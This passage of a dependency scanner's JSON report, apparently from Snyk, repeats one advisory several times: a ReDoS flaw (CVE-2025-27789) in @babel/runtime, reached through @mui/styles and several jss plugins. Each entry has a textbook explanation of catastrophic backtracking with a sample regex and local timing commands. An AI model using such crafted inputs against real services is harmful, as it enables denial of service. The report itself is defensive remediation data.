        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss-plugin-global@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-global@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss-plugin-nested@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-nested@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss-plugin-props-sort@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-props-sort@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss-plugin-rule-value-function@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-rule-value-function@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
